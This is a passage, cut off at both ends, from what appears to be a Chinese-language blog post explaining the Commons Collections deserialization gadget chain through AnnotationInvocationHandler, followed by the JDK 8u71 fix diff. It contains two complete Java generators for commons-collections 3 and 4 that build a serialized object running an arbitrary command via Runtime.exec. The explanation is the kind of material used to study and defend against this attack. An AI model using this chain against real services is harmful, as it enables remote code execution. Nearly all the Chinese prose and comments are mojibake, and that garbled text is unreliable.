ç»“æ„ä¸å…¼å®¹ï¼Œç›´æ¥åˆ¤å®šä¸ºéæ³•å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) è·å–è¯¥æ³¨è§£ç±»å‹â€œæˆå‘˜å -&gt; æˆå‘˜è¿”å›ç±»å‹â€çš„æ˜ å°„ï¼ˆä¾‹å¦‚ &quot;value&quot; -&gt; String.classï¼‰</span></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) éå†å½“å‰æŒæœ‰çš„â€œæˆå‘˜å -&gt; æˆå‘˜å€¼â€æ˜ å°„ï¼Œé€é¡¹åšç±»å‹ä¸€è‡´æ€§æ£€æŸ¥</span></span><br><span class="line">    <span class="comment">// æ³¨ï¼šå¦‚æœæŸä¸ªæ³¨è§£æˆå‘˜ç¼ºå€¼ï¼Œè¿™ç§æƒ…å†µç”±åç»­çš„ invokeï¼ˆä»£ç†è°ƒç”¨ï¼‰æ—¶å†å¤„ç†ï¼Œè¿™é‡Œä¸å¼ºè¡ŒæŠ¥é”™ã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="comment">// åœ¨å½“å‰æ³¨è§£å®šä¹‰ä¸­ï¼Œè¯¥æˆå‘˜æ˜¯å¦ä»ç„¶å­˜åœ¨ï¼ˆç‰ˆæœ¬æ¼”è¿›å¯èƒ½å¯¼è‡´æˆå‘˜è¢«ç§»é™¤ï¼‰</span></span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// æˆå‘˜ä¾ç„¶å­˜åœ¨</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5) ç±»å‹ä¸€è‡´æ€§æ£€æŸ¥ï¼š</span></span><br><span class="line">            <span class="comment">//    - å¦‚æœ value ä¸æ˜¯â€œæœŸæœ›çš„è¿”å›ç±»å‹å®ä¾‹â€ï¼Œä¸”ä¹Ÿä¸æ˜¯ ExceptionProxyï¼ˆå»¶è¿ŸæŠ›é”™çš„å ä½å¯¹è±¡ï¼‰ï¼Œ</span></span><br><span class="line">            <span class="comment">//      åˆ™å°†å…¶æ›¿æ¢ä¸º AnnotationTypeMismatchExceptionProxyã€‚</span></span><br><span class="line">            <span class="comment">//    - è¿™æ ·åšå¯ä»¥æŠŠâ€œé”™è¯¯çš„æˆå‘˜å€¼â€å»¶è¿Ÿåˆ°çœŸæ­£è¯»å–è¯¥æ³¨è§£æˆå‘˜æ—¶å†æŠ›å‡ºâ€œç±»å‹ä¸åŒ¹é…â€å¼‚å¸¸ï¼Œ</span></span><br><span class="line">            <span class="comment">//      ä»è€Œé¿å…è¿™é‡Œç›´æ¥å¤±è´¥ï¼Œæå‡å…¼å®¹æ€§ä¸é”™è¯¯å®šä½å‹å¥½åº¦ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue( <span class="comment">// ğŸ‘ˆ memberValue çš„ setValue æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        <span class="comment">// è¿™é‡Œä¼šæŠŠâ€œå®é™…å€¼çš„ç±»å‹+toString()â€æ‹¼è¿›é”™è¯¯ä¿¡æ¯ä¸­</span></span><br><span class="line">                        <span class="comment">// æ³¨æ„ï¼šè¿™ä¸€ä¸²ä¼šè§¦å‘ value.toString()ï¼ˆè‹¥ç±»å‹ä¸åŒ¹é…æ‰ä¼šèµ°åˆ°è¿™é‡Œï¼‰</span></span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            <span class="comment">// ç»‘å®šåˆ°å¯¹åº”çš„ Methodï¼ˆannotationType.members() è¿”å›â€œæˆå‘˜å -&gt; æ–¹æ³•â€æ˜ å°„ï¼‰</span></span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡è¿™é‡Œéœ€è¦ç»•è¿‡ <code>memberType != null</code> åˆ¤æ–­ï¼Œæ ¹æ®è°ƒè¯•å¯çŸ¥ï¼š</p>
<ul>
<li><code>memberTypes</code> ä¸­çš„ <code>key</code> æ˜¯æ„é€ æ—¶ä¼ å…¥çš„ <code>type</code> å¯¹åº”çš„ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•åå­—ç¬¦ä¸²ã€‚</li>
<li><code>name</code> æ˜¯æ„é€ æ—¶ä¼ å…¥çš„ <code>memberValues</code> ä¸­çš„æŸä¸ª <code>key</code>ã€‚</li>
</ul>
<p>åˆå› ä¸º <code>type</code> è¿˜è¦ç»§æ‰¿è‡ª <code>Annotation</code>ï¼Œå› æ­¤å› æ­¤æˆ‘ä»¬æ„é€  <code>AnnotationInvocationHandler</code> çš„æ—¶å€™ <code>type</code> é€‰æ‹© <code>Retention.class</code> ã€‚</p>
<blockquote>
<p><code>@Retention</code> æœ¬èº«æ˜¯ä¸€ä¸ª<strong>å…ƒæ³¨è§£</strong>ï¼Œæ„å‘³ç€å®ƒæ˜¯ç”¨æ¥æ³¨è§£å…¶ä»–æ³¨è§£çš„ã€‚<code>@Retention</code> çš„è®¾è®¡ä¹Ÿéµå¾ªäº† Java æ³¨è§£çš„è§„èŒƒï¼šæ¯ä¸ªæ³¨è§£ç±»å‹éƒ½ç»§æ‰¿è‡ª <code>Annotation</code> æ¥å£ï¼Œè¿™ä¿è¯äº†æ³¨è§£ç±»å‹çš„ä¸€è‡´æ€§ã€‚</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>; <span class="comment">// æ„é€  `AnnotationInvocationHandler` çš„æ—¶å€™ `type` é€‰æ‹© `Retention.class` ï¼Œè¿™æ · `memberTypes` ä¸­çš„é”®å°±æœ‰ä¸€ä¸ª `value` å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸º <code>Retention</code> ä¸­æœ‰ä¸€ä¸ª <code>value</code> æ–¹æ³•ï¼Œå› æ­¤ <code>memberTypes</code> ä¼šæœ‰ä¸€ä¸ª <code>value</code> å­—ç¬¦ä¸²çš„é”®ã€‚æˆ‘ä»¬é¢„å…ˆåœ¨ <code>memberValues</code> ä¸­å­˜ä¸€ä¸ª <code>value</code> å­—ç¬¦ä¸²çš„é”®ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œåˆ° <code>setValue</code> æ–¹æ³•ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>commons-collections4 åªæ˜¯å°† <code>TransformedMap.decorate</code> æ›´æ”¹ä¸º <code>TransformedMap.transformingMap</code>ï¼Œå…¶ä½™ä¸å˜ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.transformingMap(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰"><a href="#ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰" class="headerlink" title="ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰"></a>ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</h4><p>åœ¨ 8u71 ä»¥åå¤§æ¦‚æ˜¯ 2015 å¹´ 12 æœˆçš„æ—¶å€™ï¼ŒJava å®˜æ–¹<a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >ä¿®æ”¹<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>äº† <code>sun.reflect.annotation.AnnotationInvocationHandler</code> çš„ <code>readObject</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span 